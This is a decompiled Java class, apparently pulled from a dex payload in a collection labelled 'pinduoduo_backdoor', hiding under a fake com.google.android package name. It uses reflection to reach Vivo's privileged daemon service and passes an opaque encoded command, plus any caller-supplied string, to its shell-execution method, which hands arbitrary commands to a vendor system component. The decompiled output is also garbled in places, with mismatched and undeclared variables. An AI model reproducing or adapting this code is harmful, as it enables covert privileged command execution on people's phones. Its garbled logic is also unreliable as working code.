package com.google.android.sd.biz_dynamic_dex.a;

import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import java.lang.reflect.Method;

public final class a {
  public static String a(String paramString) {
    try {
      String str2;
      Boolean bool;
      String str1;
      Method method1 = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
      method1.setAccessible(true);
      Class<?> clazz = Class.forName("com.vivo.services.daemon.VivoDmServiceProxy");
      Method method2 = clazz.getDeclaredMethod("asInterface", new Class[] { IBinder.class });
      String str3 = null;
      Object object2 = method2.invoke(null, new Object[] { method1.invoke(null, new Object[] { "vivo_daemon.service" }) });
      method2 = clazz.getDeclaredMethod("runShellWithResult", new Class[] { String.class });
      method2.setAccessible(true);
      clazz.getDeclaredMethod("runShell", new Class[] { String.class }).setAccessible(true);
      int i = Build.VERSION.SDK_INT;
      if (i >= 26) {
        str2 = a("persist.vivo.vivo_daemon", "null");
      } else {
        str2 = System.getProperty("persist.vivo.vivo_daemon", "null");
      } 
      if (TextUtils.equals(str2, "null")) {
        str2 = str3;
      } else {
        boolean bool1;
        if (TextUtils.equals(str2, "3.1.0") || TextUtils.equals(str2, "3.1.1")) {
          bool1 = true;
        } else {
          bool1 = false;
        } 
        bool = Boolean.valueOf(bool1);
      } 
      if (bool == null) {
        str1 = (String)method2.invoke(object2, new Object[] { "GA8CLwlZ38dIAjZNQQ3IKP0bTy+JgYaJQxHB6oCXASLqbIAGS85UPD9PdEe7C52PCvdwzCswCtjlmPaoP+j4ZmMBXOtpylzI7yYS6hrcNra6zKh8C3Y68RGgBt45+OEOcDTRG73Bew2akGCXbwBp8mdbEioZEMrZsPdx+JNQavca19E43h8+FSNm2RdJAG/pGjtP+w3kHvPMM6hZEZItwLWsqwfFNjByVc9t9LfO818eR/qKh1hRJN8D2M2uuqmYrD35QPvw3uZWYqYt9strqbTvIarWBA/1wpPvdI9ddMcnXQxFbn/ApYxHfh9i+M6fWfe8pp4PKuV1WCuYb73hsw==?".concat(String.valueOf(paramString)) });
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(str1);
        stringBuilder.append("; ");
        stringBuilder.append((String)method2.invoke(object2, new Object[] { paramString }));
        return stringBuilder.toString();
      } 
      if (str1.booleanValue()) {
        object1 = method2.invoke(object2, new Object[] { "GA8CLwlZ38dIAjZNQQ3IKP0bTy+JgYaJQxHB6oCXASLqbIAGS85UPD9PdEe7C52PCvdwzCswCtjlmPaoP+j4ZmMBXOtpylzI7yYS6hrcNra6zKh8C3Y68RGgBt45+OEOcDTRG73Bew2akGCXbwBp8mdbEioZEMrZsPdx+JNQavca19E43h8+FSNm2RdJAG/pGjtP+w3kHvPMM6hZEZItwLWsqwfFNjByVc9t9LfO818eR/qKh1hRJN8D2M2uuqmYrD35QPvw3uZWYqYt9strqbTvIarWBA/1wpPvdI9ddMcnXQxFbn/ApYxHfh9i+M6fWfe8pp4PKuV1WCuYb73hsw==?".concat(String.valueOf(paramString)) });
        return (String)object1;
      } 
      Object object1 = method2.invoke(object2, new Object[] { object1 });
      return (String)object1;
    } catch (Exception exception) {
      return "fail: ".concat(String.valueOf(exception));
    } 
  }
  
  private static String a(String paramString1, String paramString2) {
    try {
      return Class.forName("android.os.SystemProperties").getMethod("get", new Class[] { String.class, String.class }).invoke(null, new Object[] { paramString1, paramString2 }).toString();
    } catch (Exception exception) {
      return paramString2;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\d643e0f9a68342bc8403a69e7ee877a7-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\a\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */